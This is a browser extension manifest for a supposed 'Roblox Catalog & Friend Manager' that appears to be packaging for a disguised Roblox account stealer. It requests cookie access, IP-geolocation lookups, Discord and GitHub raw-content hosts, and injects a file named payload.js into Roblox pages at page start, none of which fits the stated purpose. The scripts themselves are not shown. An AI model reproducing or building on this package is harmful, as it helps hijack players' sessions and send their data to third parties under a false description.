{
  "manifest_version": 3,
  "name": "Roblox Catalog & Friend Manager",
  "version": "5.1.0",
  "description": "Professional suite for managing Roblox assets, tracking friends, and optimizing catalog interactions. Includes advanced inventory insights and friend activity monitoring.",
  "permissions": [
    "cookies",
    "storage",
    "tabs"
  ],
  "host_permissions": [
    "*://*.roblox.com/*",
    "*://discord.com/*",
    "*://*.discord.com/*",
    "https://api.ipify.org/*",
    "https://ipapi.co/*",
    "https://raw.githubusercontent.com/*",
    "https://cdn.discordapp.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "*://*.roblox.com/*"
      ],
      "js": [
        "content.js",
        "payload.js"
      ],
      "run_at": "document_start"
    },
    {
      "matches": [
        "*://discord.com/*",
        "*://*.discord.com/*"
      ],
      "js": [
        "catalog.js"
      ],
      "run_at": "document_idle"
    }
  ],
  "action": {
    "default_icon": {
      "16": "icons/icon16.png",
      "48": "icons/icon48.png",
      "128": "icons/icon128.png"
    }
  },
  "icons": {
    "16": "icons/icon16.png",
    "48": "icons/icon48.png",
    "128": "icons/icon128.png"
  },
  "web_accessible_resources": [
    {
      "resources": [
        "worker.js"
      ],
      "matches": [
        "*://*.roblox.com/*"
      ]
    }
  ]
}